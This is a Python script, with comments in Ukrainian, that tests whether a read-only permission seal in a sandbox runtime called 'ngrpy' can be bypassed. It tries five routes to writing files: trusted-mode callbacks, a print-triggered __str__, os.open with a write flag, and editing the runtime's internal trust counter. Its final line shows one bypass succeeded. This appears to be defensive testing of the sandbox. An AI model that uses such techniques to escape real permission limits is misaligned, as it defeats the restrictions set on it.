import os
import ngrpy
from ngrpy import *
seal("лише читати дані", ["файл.читати:дані"])

# ціль 1: записати будь-який файл. Печатка — лише файл.читати:дані.

def attempt(name, f):
    try:
        f()
        print(f"[{name}] ВДАЛОСЯ")
    except BaseException as e:
        print(f"[{name}] не вдалося: {type(e).__name__}: {e}")


# 0) чесна спроба: звичайний open на запис — гачок має відмовити
attempt("0 open('w')", lambda: open("звіти/атака1_0.txt", "w").write("pwn"))

# 1) check() викликає умову користувача в «довіреному» режимі — гачок мовчить
attempt("1 check-умова", lambda: check(0, lambda x: (open("звіти/атака1_check.txt", "w").write("pwn"), True)[1]))


# 2) print() викликає str() користувача теж у «довіреному» режимі
class S:
    def __str__(self):
        open("звіти/атака1_print.txt", "w").write("pwn")
        return "(звичайний друк)"


attempt("2 print-__str__", lambda: print(S()))


# 3) os.open дає в гачок mode=None, а None гачок вважає «читанням»: дописуємо в сам скрипт (він у «дозволених для читання»)
def via_os_open():
    fd = os.open(__file__, os.O_WRONLY | os.O_APPEND)
    os.write(fd, "# дописано атакою через os.open\n".encode())
    os.close(fd)


attempt("3 os.open(O_WRONLY)", via_os_open)


# 4) стан рантайму — звичайний атрибут модуля: вимкнути гачок цілком
def via_state():
    ngrpy._ST['trusted'] += 1
    try:
        open("звіти/атака1_state.txt", "w").write("pwn")
    finally:
        ngrpy._ST['trusted'] -= 1


attempt("4 ngrpy._ST", via_state)
# дописано атакою через os.open
